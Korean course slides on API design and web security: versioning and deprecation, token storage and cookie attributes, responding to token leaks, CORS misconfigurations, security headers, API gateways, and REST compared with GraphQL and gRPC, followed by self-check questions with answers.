응답에 선택 필드를 추가하거나 새 엔드포인트를 만드는 것은 하위 호환 변경입니다. 옛 앱은 모르는 필드를 무시하면 그만이라 아무 일도 없습니다. 그래서 클라이언트를 만들 때 "모르는 필드는 무시"하도록 해 두는 것이 중요합니다. Java의 JSON 라이브러리 Jackson이라면 모르는 필드를 만났을 때 실패하지 않게 설정합니다.

반면 필드 삭제, 이름 변경, 타입 변경(숫자를 문자열로), 선택이던 요청 필드를 필수로 바꾸는 것은 옛 앱을 깨는 깨는 변경입니다. 이때만 새 버전을 만들고, 옛 버전과 한동안 함께 운영합니다.

옛 버전을 내릴 때는 갑자기 끄지 않습니다. 응답에 Deprecation 헤더(RFC 9745)로 "곧 없어진다"를, Sunset 헤더(RFC 8594)로 종료 날짜를 알리고, 옛 버전 호출량이 충분히 줄었는지 지표로 확인한 뒤 내립니다.

버전 표시는 대개 URI 경로에 둔다

새 버전을 만들기로 했다면 클라이언트가 어느 버전을 원하는지 요청에 어떻게 표시할지 정해야 합니다. 세 가지 방식이 쓰이며, 셋 다 장단이 분명합니다.

방식예장점단점
URI 경로/v1/orders눈에 보이고 라우팅 쉬움리소스 주소가 바뀜
커스텀 헤더Api-Version: 2URI 유지테스트, 캐시 설정이 번거로움
미디어 타입Accept: …v2+jsonHTTP 의미에 가장 충실도구 지원이 약함

REST 원칙만 보면 같은 리소스의 주소가 버전마다 달라지는 URI 방식이 어색하지만, 로그와 브라우저에서 바로 보이고 게이트웨이에서 경로만으로 나눌 수 있어 가장 많이 씁니다.

토큰 저장 위치는 XSS와 CSRF의 교환이다

5부의 두 공격이 모아마켓 웹 화면의 토큰 보관 위치를 정합니다. 스크립트가 읽을 수 있는 곳은 XSS에 약하고, 브라우저가 자동으로 보내는 곳은 CSRF에 약합니다.

저장 위치XSS에CSRF에판단
localStorage스크립트로 바로 탈취자동 전송 없어 안전XSS 하나로 장기 토큰 유출
HttpOnly 쿠키스크립트로 읽을 수 없음자동 전송, 방어 필요SameSite와 CSRF 토큰 병행
메모리(변수)페이지 안에서만 노출안전새로고침 시 사라짐

흔한 조합은 Access Token은 메모리에, Refresh Token은 HttpOnly 쿠키에 두고, 새로고침 때 쿠키로 재발급받는 것입니다. 다만 XSS가 있으면 어느 방식이든 그 페이지 안에서 요청을 대신 보낼 수 있으니, 저장 위치는 피해 범위를 줄일 뿐 XSS 방어를 대신하지 않습니다.

쿠키 속성 하나하나가 공격 하나씩을 막는다

Set-Cookie: __Secure-rt=8f3a...;
  Path=/auth/refresh;
  Secure; HttpOnly;
  SameSite=Strict;
  Max-Age=1209600
속성막는 것
Secure평문 HTTP 전송으로 탈취
HttpOnlyXSS 스크립트의 읽기
SameSite교차 사이트 요청에 첨부(CSRF)
Path불필요한 엔드포인트로 전송

Refresh Token 쿠키는 재발급 경로에만 가도록 Path를 좁히고, 14일(1,209,600초)처럼 수명을 명시합니다. 이름 앞의 __Secure- 접두사는 Secure가 빠진 설정을 브라우저가 거부하게 만드는 안전장치입니다.

웹과 API가 다른 사이트에 있어 SameSite=None이 필요하다면 쿠키가 교차 사이트에도 붙으므로, 5부의 CSRF 토큰이나 Origin 확인을 반드시 함께 둡니다.

토큰이 털렸을 때는 범위부터 끊는다

  1. Refresh 폐기

    해당 사용자의 토큰 계열을 모두 폐기해 재발급 통로를 닫습니다.

  2. Access 차단

    사용자별 토큰 버전을 올려 그 전에 발급된 토큰을 거절합니다.

  3. 키 교체

    서명 키가 샜다면 새 kid로 교체하고 JWKS에서 옛 키를 내립니다.

  4. 경로 추적

    발급 로그와 IP, User-Agent로 유출 경로와 영향 범위를 찾습니다.

  5. 재발 방지

    XSS 수정, 만료 단축, 비밀번호 재설정 요구 등을 적용합니다.

2단계의 토큰 버전은 회원 테이블에 숫자 하나를 두고 토큰 클레임에도 같은 숫자를 넣는 방식입니다. 숫자를 올리면 옛 토큰은 모두 불일치로 거절되니, 블랙리스트에 토큰을 하나하나 넣지 않아도 됩니다.

JWT를 무상태로만 운영하면 이 순간 할 수 있는 일이 "만료 기다리기"뿐입니다. 그래서 평소에 버전이나 블랙리스트를 확인할 지점을 인증 필터에 만들어 둡니다.

CORS 설정 실수는 대개 다섯 가지다

"Postman으로는 되는데 웹에서만 CORS 에러"는 대개 아래 중 하나입니다. 두 용어만 먼저 짚습니다. Vary: Origin은 "이 응답은 Origin 헤더 값에 따라 다르다"고 CDN(사용자 가까이에서 응답을 캐시해 주는 중계 서버, 8장) 같은 캐시에 알리는 헤더이고, null 출처는 파일이나 샌드박스 iframe처럼 출처를 밝힐 수 없는 곳에서 브라우저가 보내는 값입니다.

실수무슨 일이 생기나고치는 법
요청 Origin을 그대로 반사credentials와 겹치면 아무 사이트나 읽음허용 목록과 정확히 비교
접미사 정규식 매칭evilshop.com도 통과스킴과 호스트 전체 비교
null 출처 허용샌드박스 iframe에서 우회null은 허용하지 않음
Vary: Origin 누락CDN이 다른 출처 응답을 재사용출처별 응답이면 Vary 추가
사전 요청에 401인증 필터가 OPTIONS를 막음CORS를 인증보다 먼저 처리

마지막 줄은 4부 설정의 .cors(withDefaults())가 해결합니다. 사전 요청에는 Authorization 헤더가 없으므로, CORS 필터가 인증 필터보다 먼저 응답해야 합니다.

보안 응답 헤더는 브라우저에 규칙을 맡긴다

CSP처럼 서버가 응답 헤더 한 줄로 브라우저에 방어를 맡기는 장치가 몇 가지 더 있습니다. 웹 화면을 내보내는 서버나 그 앞단에서 기본으로 켜 둡니다. Spring Security도 상당수를 기본으로 붙입니다.

헤더브라우저에 요구하는 것막는 것
Strict-Transport-Security이 사이트는 앞으로 HTTPS로만 접속첫 HTTP 접속 가로채기
Content-Security-Policy허용한 출처의 스크립트만 실행XSS 피해 확산
X-Content-Type-Optionsnosniff: 선언된 타입대로만 해석업로드 파일의 스크립트 실행
frame-ancestors (CSP)다른 사이트가 iframe으로 못 띄움투명 iframe으로 클릭 유도

첫 줄은 흔히 HSTS라고 부릅니다. CloudFront 같은 CDN에서 이 헤더들을 일괄로 붙이는 방법은 16장에서 봅니다.

API Gateway는 공통 관심사를 앞단에 모은다

모아마켓이 주문, 회원, 상품 서비스로 나뉘면 인증, TLS 종료, 라우팅, 요청 제한, 로깅을 서비스마다 반복하게 됩니다. API Gateway는 모든 외부 요청이 지나는 단일 입구에서 이것들을 한 번에 처리하는 리버스 프록시(2장, 클라이언트 대신 서버 앞에 서는 중계 서버)입니다.

Spring Cloud Gateway, Kong, AWS API Gateway(17장)가 대표적이고, 요청 제한 알고리즘은 8장에서 다룹니다.

비즈니스 로직은 넣지 마세요

모든 요청이 지나는 곳이라, 멈추면 서비스 전체가 멈추는 단일 장애점이 되기 쉽습니다. 얇게 유지하고 여러 대로 띄웁니다.

게이트웨이가 JWT를 검증해도 내부 서비스가 인가를 생략하면 안 됩니다. "내부망은 안전하다"는 가정은 서버 하나만 뚫려도 깨집니다.

REST의 약점을 다르게 푼 것이 GraphQL과 gRPC다

REST는 응답 모양을 서버가 정합니다. 모아마켓 앱의 주문 목록 화면은 주문 번호와 금액만 필요한데 API가 배송지와 상품 상세까지 주면 데이터를 낭비하고, 반대로 상품 이미지가 따로 필요하면 요청을 여러 번 보내야 합니다. 화면 종류가 많을수록 이 어긋남이 커집니다.

GraphQL은 엔드포인트를 /graphql 하나로 두고, 클라이언트가 { orders { id amount } }처럼 필요한 필드를 쿼리 언어로 골라 보냅니다. 서버는 필드마다 값을 채우는 함수인 리졸버를 실행해 그 모양 그대로 돌려줍니다. 화면별 요구가 다양한 앱에 맞습니다.

gRPC는 서비스 간 호출을 위한 방식입니다. 주고받을 메시지와 메서드를 .proto 파일에 정의하면 양쪽 코드가 생성되고, 데이터는 JSON 대신 Protobuf라는 작은 바이너리 형식으로, 연결은 2장의 HTTP/2로 여러 호출을 한 연결에 겹쳐 보냅니다. 사람이 읽기는 어렵지만 빠르고 타입이 엄격합니다.

다음 슬라이드에서 셋을 나란히 놓고 어디에 어울리는지 봅니다.

공개 API는 REST, 화면은 GraphQL, 내부는 gRPC

항목RESTGraphQLgRPC

응답 모양서버가 정함클라이언트가 필드 선택.proto 스키마로 고정

GraphQL은 필드마다 리졸버가 돌아, 주문 100건의 회원을 각각 조회하는 6장의 N+1 문제가 그대로 생기기 쉽습니다. 그래서 같은 종류의 조회를 모아 한 번에 처리하는 DataLoader를 함께 씁니다. gRPC는 브라우저가 HTTP/2 세부를 직접 다루지 못해 gRPC-Web 같은 중계가 필요하므로, 주로 서버끼리 씁니다.

정리

  • API는 예측 가능해야 오래 버팁니다. 리소스 중심 URI, 의미에 맞는 상태 코드, 표준 에러 포맷, 깨는 변경에만 올리는 버전이 바탕입니다.
  • 움직이는 데이터와 재시도를 설계에 넣습니다. 깊은 목록은 cursor로, 결제 POST는 Idempotency-Key와 원자적 선점으로 결과를 고정합니다.
  • 암호 도구는 답하는 질문이 다릅니다. 암호화는 기밀성, MAC은 무결성, 서명은 서명자까지 보장합니다. 비밀번호는 솔트와 느린 해시로 저장합니다.
  • JWT는 무상태로 검증되지만 취소가 어렵습니다. 짧은 Access, Rotation되는 Refresh, 블랙리스트로 메우고, 위임은 OAuth와 PKCE, 로그인은 OIDC로 합니다.
  • CORS는 방패가 아니라 브라우저의 읽기 허가입니다. XSS는 이스케이프와 CSP, CSRF는 토큰과 SameSite, SQL Injection은 바인딩으로 막습니다.

스스로 점검 (1)

  1. 무한 스크롤 피드를 offset으로 만들면 어떤 문제가 보이나요?

    스크롤하는 사이 새 글이 들어오면 이미 본 글이 다시 나오고, 깊이 내려갈수록 DB가 건너뛸 행을 읽느라 느려집니다. 위치 대신 마지막 값으로 이어 가는 cursor 방식이 두 문제를 함께 풉니다.

  2. Idempotency-Key를 "조회 후 없으면 저장"으로 구현하면 왜 위험한가요?

    동시에 도착한 두 요청이 모두 "없음"을 보고 결제를 실행할 수 있습니다. 유니크 제약 INSERT나 SET NX처럼 확인과 저장을 한 동작으로 해야 합니다.

  3. 서버가 토큰 내용 옆에 SHA-256 해시만 붙여 준다면 무엇이 문제인가요?

    해시는 누구나 계산할 수 있으므로 공격자가 내용을 바꾸고 해시도 다시 계산해 붙이면 통과합니다. 서버만 아는 비밀이 섞인 MAC이나 개인키 서명이 필요합니다.

  4. 서비스 다섯 개가 토큰을 검증한다면 HS256보다 RS256이 나은 이유는?

    HS256은 다섯 서비스 모두 발급 키를 가져 어느 하나가 털리면 토큰을 위조할 수 있습니다. RS256은 공개키만 배포하므로 발급 능력이 인증 서버에만 남습니다.

스스로 점검 (2)

  1. SHA-256에 솔트만 붙이면 비밀번호 저장으로 충분한가요?

    미리 계산한 표는 막지만 SHA-256이 너무 빨라 회원 한 명씩에 대한 대입 공격은 여전히 빠릅니다. bcrypt나 Argon2id로 한 번의 계산 비용을 키워야 합니다.

  2. Rotation 중 이미 쓴 Refresh Token이 다시 들어오면 왜 계열 전체를 폐기하나요?

    정상 클라이언트는 최신 토큰만 쓰므로 재사용은 복사본이 있다는 신호입니다. 누가 진짜인지 서버가 구분할 수 없어 전부 끊고 재로그인을 요구합니다.

  3. OAuth에서 구글이 토큰을 주소창으로 바로 주지 않고 code를 주는 이유는?

    주소창(프론트 채널)을 지나는 값은 기록과 로그로 새기 쉽습니다. 일회용 code만 노출하고, 토큰은 클라이언트가 secret이나 PKCE verifier를 내고 백 채널로 받게 해서 code가 새도 쓸모없게 만듭니다.

  4. CORS를 막아 두었는데 CSRF 공격이 성공했습니다. 어떻게 가능할까요?

    폼 POST 같은 단순 요청은 사전 요청 없이 전송되고 쿠키도 붙습니다. CORS는 응답 읽기만 막으므로 CSRF 토큰이나 SameSite가 필요합니다.

스스로 점검 (3)

  1. Bearer 토큰 API에서는 CSRF 방어를 꺼도 되는데, 쿠키 인증에서는 왜 안 되나요?

    Authorization 헤더는 브라우저가 자동으로 붙이지 않아 공격 페이지가 인증된 요청을 만들 수 없습니다. 쿠키는 어느 사이트에서 시작된 요청에도 자동으로 붙을 수 있으므로 별도 방어가 필요합니다.

  2. MyBatis에서 정렬 컬럼을 ${sort}로 받으면 무엇이 문제인가요?

    ${}는 문자열 치환이라 입력이 SQL 문법이 되어 Injection이 가능합니다. 컬럼명은 바인딩할 수 없으므로 허용 목록으로 검사한 값만 넣습니다.
